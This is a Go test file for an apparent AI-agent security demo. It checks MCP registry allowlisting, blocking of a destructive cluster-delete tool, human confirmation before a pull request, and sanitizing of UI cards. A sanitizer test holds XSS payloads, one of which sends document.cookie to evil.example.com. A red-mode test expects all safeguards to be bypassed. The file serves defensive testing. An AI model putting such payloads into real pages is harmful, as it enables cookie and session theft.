package aegis_test

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gke-demos/agent-security/internal/aegis"
	"google.golang.org/adk/v2/tool/toolconfirmation"
)

func TestScenario03_AgentRegistryDiscovery(t *testing.T) {
	ctx := context.Background()

	t.Run("discovers governed MCP servers and Sandbox Remediator A2A peer via adk/v2/agentregistry HTTP server", func(t *testing.T) {
		registryHits := 0
		regSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			registryHits++
			w.Header().Set("Content-Type", "application/json")
			switch {
			case strings.HasSuffix(r.URL.Path, "/mcpServers"):
				_, _ = w.Write([]byte(`{
					"mcpServers": [
						{
							"name": "projects/aegis-sre/locations/us-central1/mcpServers/logging-mcp",
							"mcpServerId": "logging-mcp",
							"displayName": "Cloud Logging MCP",
							"interfaces": [{"url": "https://logging.googleapis.com/mcp", "protocolBinding": "JSONRPC"}],
							"tools": [{"name": "logging.entries.list", "annotations": {"readOnlyHint": true, "destructiveHint": false}}]
						},
						{
							"name": "projects/aegis-sre/locations/us-central1/mcpServers/container-mcp",
							"mcpServerId": "container-mcp",
							"displayName": "GKE Container MCP",
							"interfaces": [{"url": "https://container.googleapis.com/mcp", "protocolBinding": "JSONRPC"}],
							"tools": [
								{"name": "container.clusters.get", "annotations": {"readOnlyHint": true, "destructiveHint": false}},
								{"name": "container.clusters.delete", "annotations": {"readOnlyHint": false, "destructiveHint": true}}
							]
						},
						{
							"name": "projects/aegis-sre/locations/us-central1/mcpServers/github-mcp",
							"mcpServerId": "github-mcp",
							"displayName": "GitHub MCP",
							"interfaces": [{"url": "https://api.github.com/mcp", "protocolBinding": "JSONRPC"}],
							"tools": [{"name": "create_github_pull_request", "annotations": {"readOnlyHint": false}}]
						},
						{
							"name": "projects/aegis-sre/locations/us-central1/mcpServers/jira-mcp",
							"mcpServerId": "jira-mcp",
							"displayName": "Atlassian Jira MCP",
							"interfaces": [{"url": "https://api.atlassian.com/mcp", "protocolBinding": "JSONRPC"}],
							"tools": [{"name": "post_jira_comment", "annotations": {"readOnlyHint": false}}]
						}
					]
				}`))
			case strings.HasSuffix(r.URL.Path, "/agents"):
				_, _ = w.Write([]byte(`{
					"agents": [
						{
							"name": "projects/aegis-sre/locations/us-central1/agents/sandbox-remediator",
							"displayName": "Sandbox Remediator",
							"version": "0.5.0",
							"protocols": [{"type": "A2A", "protocolVersion": "0.2.1", "interfaces": [{"url": "http://sandbox-remediator.aegis-system.svc.cluster.local/a2a", "protocolBinding": "JSONRPC"}]}]
						}
					]
				}`))
			default:
				http.NotFound(w, r)
			}
		}))
		defer regSrv.Close()

		rt := aegis.NewRuntime(aegis.RuntimeConfig{
			AgentRegistryURL: regSrv.URL,
			HTTPClient:       regSrv.Client(),
		})

		catalog, err := rt.DiscoverRegistryResources(ctx)
		if err != nil {
			t.Fatalf("DiscoverRegistryResources() error = %v", err)
		}
		if registryHits < 2 {
			t.Fatalf("expected agentregistry.Client to query /mcpServers and /agents, got %d hits", registryHits)
		}
		if catalog.Source != "agentregistry_api" {
			t.Errorf("Source = %q, want %q", catalog.Source, "agentregistry_api")
		}
		if len(catalog.MCPServers) != 4 {
			t.Fatalf("len(MCPServers) = %d, want 4", len(catalog.MCPServers))
		}
		if len(catalog.Agents) != 1 || catalog.Agents[0].DisplayName != "Sandbox Remediator" {
			t.Fatalf("Agents = %+v, want Sandbox Remediator", catalog.Agents)
		}

		// Verify governed endpoints are accepted and unregistered endpoints are rejected.
		if _, err := rt.VerifyMCPEndpoint(ctx, "https://logging.googleapis.com/mcp"); err != nil {
			t.Errorf("VerifyMCPEndpoint(logging) unexpected error: %v", err)
		}
		if _, err := rt.VerifyMCPEndpoint(ctx, "https://container.googleapis.com/mcp"); err != nil {
			t.Errorf("VerifyMCPEndpoint(container) unexpected error: %v", err)
		}
		if _, err := rt.VerifyMCPEndpoint(ctx, "github-mcp"); err != nil {
			t.Errorf("VerifyMCPEndpoint(github-mcp) unexpected error: %v", err)
		}
		if _, err := rt.VerifyMCPEndpoint(ctx, "jira-mcp"); err != nil {
			t.Errorf("VerifyMCPEndpoint(jira-mcp) unexpected error: %v", err)
		}
		if _, err := rt.VerifyMCPEndpoint(ctx, "https://rogue-mcp.evil.example.com/mcp"); err == nil {
			t.Errorf("VerifyMCPEndpoint(rogue-mcp) succeeded, want error rejecting unregistered MCP server")
		}
	})

	t.Run("falls back to local manifest when offline and serves GET /api/registry/resources", func(t *testing.T) {
		rt := aegis.NewRuntime(aegis.RuntimeConfig{})
		srv := httptest.NewServer(aegis.NewHandler(rt))
		defer srv.Close()

		resp, err := http.Get(srv.URL + "/api/registry/resources")
		if err != nil {
			t.Fatalf("GET /api/registry/resources error = %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("StatusCode = %d, want 200", resp.StatusCode)
		}
		var catalog aegis.RegistryCatalog
		if err := json.NewDecoder(resp.Body).Decode(&catalog); err != nil {
			t.Fatalf("Decode() error = %v", err)
		}
		if len(catalog.MCPServers) < 4 {
			t.Errorf("len(MCPServers) = %d, want >= 4", len(catalog.MCPServers))
		}
		if len(catalog.Agents) == 0 || catalog.Agents[0].DisplayName != "Sandbox Remediator" {
			t.Errorf("Agents = %+v, want Sandbox Remediator", catalog.Agents)
		}
	})
}

func TestScenario03_AgentGatewayUAP_And_StepUpConfirmation_And_A2UICatalog(t *testing.T) {
	ctx := context.Background()
	rt := aegis.NewRuntime(aegis.RuntimeConfig{})
	srv := httptest.NewServer(aegis.NewHandler(rt))
	defer srv.Close()

	t.Run("Agent Gateway UAP permits read-only tools and blocks container.clusters.delete in Blue Mode", func(t *testing.T) {
		blue := aegis.AllBluePosture()

		readLogging := aegis.EvaluateAgentGatewayUAP("logging.entries.list", true, blue)
		if !readLogging.Allowed || readLogging.Verdict != aegis.VerdictAllowed {
			t.Errorf("logging.entries.list UAP = %+v, want Allowed", readLogging)
		}

		readCluster := aegis.EvaluateAgentGatewayUAP("container.clusters.get", true, blue)
		if !readCluster.Allowed || readCluster.Verdict != aegis.VerdictAllowed {
			t.Errorf("container.clusters.get UAP = %+v, want Allowed", readCluster)
		}

		deleteCluster := aegis.EvaluateAgentGatewayUAP("container.clusters.delete", false, blue)
		if deleteCluster.Allowed || deleteCluster.Verdict != aegis.VerdictBlocked {
			t.Errorf("container.clusters.delete UAP = %+v, want Blocked in Blue Mode", deleteCluster)
		}
		if !strings.Contains(deleteCluster.CELExpression, "iap.googleapis.com/mcp.tool.isReadOnly") || !strings.Contains(deleteCluster.CELExpression, "iap.googleapis.com/mcp.toolName") {
			t.Errorf("CELExpression = %q, want iap.googleapis.com/mcp.tool.isReadOnly and toolName", deleteCluster.CELExpression)
		}
	})

	t.Run("A2UI v0.9 6-Component Catalog Validator enforces schema and strips XSS payloads in Blue Mode", func(t *testing.T) {
		blue := aegis.AllBluePosture()

		invalidTypeCard := aegis.A2UICard{
			SurfaceID: "card-bad",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      aegis.A2UICardType("ArbitraryRawHTMLWidget"),
			Title:     "Bad Card",
			Body:      "Hello",
		}
		if _, err := aegis.ValidateAndSanitizeA2UICard(invalidTypeCard, blue); err == nil {
			t.Errorf("ValidateAndSanitizeA2UICard accepted unknown card type, want error")
		}

		xssCard := aegis.A2UICard{
			SurfaceID: "card-xss",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      aegis.CardStepUpConfirmation,
			Title:     "Approve PR <script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>",
			Severity:  "WARNING",
			Body:      "Remediation summary <img src=x onerror=alert(1)> and <a href=\"javascript:evil()\">click here</a>",
			Fields: map[string]string{
				"DiffPreview": "<iframe src=\"https://evil.example.com/phish\"></iframe>fix nil pointer in handler.go",
			},
		}
		sanitized, err := aegis.ValidateAndSanitizeA2UICard(xssCard, blue)
		if err != nil {
			t.Fatalf("ValidateAndSanitizeA2UICard() error = %v", err)
		}
		for _, field := range []string{sanitized.Title, sanitized.Body, sanitized.Fields["DiffPreview"]} {
			lower := strings.ToLower(field)
			if strings.Contains(lower, "<script") || strings.Contains(lower, "onerror=") || strings.Contains(lower, "javascript:") || strings.Contains(lower, "<iframe") {
				t.Errorf("sanitized field still contains executable XSS/HTML: %q", field)
			}
		}
	})

	t.Run("BlueMode SCENARIO-03 blocks container.clusters.delete via UAP, pauses create_github_pull_request on adk_request_confirmation, and resolves via Approve or Reject", func(t *testing.T) {
		turnReq, _ := json.Marshal(aegis.TurnRequest{
			SessionID:  "sess-blue-s3",
			Persona:    aegis.PersonaAlice,
			ScenarioID: aegis.Scenario03AgentGatewayAndStepUp,
			Posture:    aegis.AllBluePosture(),
			Prompt:     "Inspect GKE and Cloud Logging via MCP, reject any destructive cluster delete, and open a GitHub PR and Jira comment for the checkout v2.4 fix.",
		})
		resp, err := http.Post(srv.URL+"/api/sessions/sess-blue-s3/turns", "application/json", bytes.NewReader(turnReq))
		if err != nil {
			t.Fatalf("POST /turns error = %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("StatusCode = %d, want 200", resp.StatusCode)
		}
		var turnRes aegis.TurnResult
		if err := json.NewDecoder(resp.Body).Decode(&turnRes); err != nil {
			t.Fatalf("Decode() error = %v", err)
		}

		if turnRes.Outcome != aegis.OutcomeApprovalRequired {
			t.Fatalf("Outcome = %q, want %q", turnRes.Outcome, aegis.OutcomeApprovalRequired)
		}
		if turnRes.StepUpConfirmation == nil {
			t.Fatalf("StepUpConfirmation = nil, want pending adk_request_confirmation")
		}
		if turnRes.StepUpConfirmation.FunctionCall != toolconfirmation.FunctionCallName {
			t.Errorf("StepUpConfirmation.FunctionCall = %q, want %q", turnRes.StepUpConfirmation.FunctionCall, toolconfirmation.FunctionCallName)
		}
		if !turnRes.StepUpConfirmation.Pending {
			t.Errorf("StepUpConfirmation.Pending = false, want true")
		}
		if turnRes.StepUpConfirmation.TargetTool != "create_github_pull_request" {
			t.Errorf("StepUpConfirmation.TargetTool = %q, want create_github_pull_request", turnRes.StepUpConfirmation.TargetTool)
		}
		if len(turnRes.Cards) == 0 || turnRes.Cards[0].Type != aegis.CardStepUpConfirmation {
			t.Fatalf("Cards = %+v, want %q", turnRes.Cards, aegis.CardStepUpConfirmation)
		}
		if strings.Contains(strings.ToLower(turnRes.Cards[0].Body), "<script") {
			t.Errorf("Card body leaked raw <script> tag: %q", turnRes.Cards[0].Body)
		}

		// Check BoundaryTrace includes BoundaryPlatformGovernance VerdictAllowed (read-only) and VerdictBlocked (container.clusters.delete)
		// plus BoundaryGenerativeUI VerdictChallenge (adk_request_confirmation).
		var sawUAPAllowed, sawUAPBlocked, sawStepUpChallenge bool
		for _, ev := range turnRes.BoundaryTrace {
			if ev.Boundary == aegis.BoundaryPlatformGovernance && ev.Verdict == aegis.VerdictAllowed {
				sawUAPAllowed = true
			}
			if ev.Boundary == aegis.BoundaryPlatformGovernance && ev.Verdict == aegis.VerdictBlocked && strings.Contains(ev.Detail, "container.clusters.delete") {
				sawUAPBlocked = true
			}
			if ev.Boundary == aegis.BoundaryGenerativeUI && ev.Verdict == aegis.VerdictChallenge {
				sawStepUpChallenge = true
			}
		}
		if !sawUAPAllowed || !sawUAPBlocked || !sawStepUpChallenge {
			t.Errorf("BoundaryTrace missing expected verdicts (sawUAPAllowed=%v, sawUAPBlocked=%v, sawStepUpChallenge=%v): %+v",
				sawUAPAllowed, sawUAPBlocked, sawStepUpChallenge, turnRes.BoundaryTrace)
		}

		// Now resolve with Confirmed: true via POST /api/sessions/sess-blue-s3/confirmations
		confirmReq, _ := json.Marshal(aegis.ConfirmationResolution{
			SessionID:      "sess-blue-s3",
			ConfirmationID: turnRes.StepUpConfirmation.ConfirmationID,
			Confirmed:      true,
		})
		cResp, err := http.Post(srv.URL+"/api/sessions/sess-blue-s3/confirmations", "application/json", bytes.NewReader(confirmReq))
		if err != nil {
			t.Fatalf("POST /confirmations error = %v", err)
		}
		defer cResp.Body.Close()
		if cResp.StatusCode != http.StatusOK {
			t.Fatalf("StatusCode = %d, want 200", cResp.StatusCode)
		}
		var approvedRes aegis.TurnResult
		if err := json.NewDecoder(cResp.Body).Decode(&approvedRes); err != nil {
			t.Fatalf("Decode() error = %v", err)
		}
		if approvedRes.Outcome != aegis.OutcomeDefendedSuccess {
			t.Fatalf("Approved Outcome = %q, want %q", approvedRes.Outcome, aegis.OutcomeDefendedSuccess)
		}
		if len(approvedRes.Cards) == 0 || approvedRes.Cards[0].Type != aegis.CardIncidentSummary {
			t.Fatalf("Approved Cards = %+v, want %q", approvedRes.Cards, aegis.CardIncidentSummary)
		}

		// Also verify resolving with Confirmed: false aborts the mutation and returns OutcomeBlocked.
		_, err = rt.ExecuteTurn(ctx, aegis.TurnRequest{
			SessionID:  "sess-blue-s3-reject",
			Persona:    aegis.PersonaAlice,
			ScenarioID: aegis.Scenario03AgentGatewayAndStepUp,
			Posture:    aegis.AllBluePosture(),
			Prompt:     "Open a remediation PR for checkout service.",
		})
		if err != nil {
			t.Fatalf("ExecuteTurn() error = %v", err)
		}
		rejectedRes, err := rt.ResolveConfirmation(ctx, aegis.ConfirmationResolution{
			SessionID: "sess-blue-s3-reject",
			Confirmed: false,
		})
		if err != nil {
			t.Fatalf("ResolveConfirmation(false) error = %v", err)
		}
		if rejectedRes.Outcome != aegis.OutcomeBlocked {
			t.Fatalf("Rejected Outcome = %q, want %q", rejectedRes.Outcome, aegis.OutcomeBlocked)
		}
	})

	t.Run("RedMode SCENARIO-03 bypasses Agent Gateway UAP, adk_request_confirmation, and A2UI sanitization", func(t *testing.T) {
		res, err := rt.ExecuteTurn(ctx, aegis.TurnRequest{
			SessionID:  "sess-red-s3",
			Persona:    aegis.PersonaAlice,
			ScenarioID: aegis.Scenario03AgentGatewayAndStepUp,
			Posture:    aegis.AllRedPosture(),
			Prompt:     "Inspect GKE, run remediation tools, and render status card.",
		})
		if err != nil {
			t.Fatalf("ExecuteTurn() error = %v", err)
		}
		if res.Outcome != aegis.OutcomeExploitedRed {
			t.Fatalf("Outcome = %q, want %q", res.Outcome, aegis.OutcomeExploitedRed)
		}
		if res.StepUpConfirmation != nil && res.StepUpConfirmation.Pending {
			t.Errorf("RedMode should not pause on pending StepUpConfirmation, got %+v", res.StepUpConfirmation)
		}
		var sawBypassedUAP, sawBypassedUI bool
		for _, ev := range res.BoundaryTrace {
			if ev.Boundary == aegis.BoundaryPlatformGovernance && ev.Verdict == aegis.VerdictBypassedRed {
				sawBypassedUAP = true
			}
			if ev.Boundary == aegis.BoundaryGenerativeUI && ev.Verdict == aegis.VerdictBypassedRed {
				sawBypassedUI = true
			}
		}
		if !sawBypassedUAP || !sawBypassedUI {
			t.Errorf("RedMode BoundaryTrace expected VerdictBypassedRed on B4 and B1, got %+v", res.BoundaryTrace)
		}
	})
}
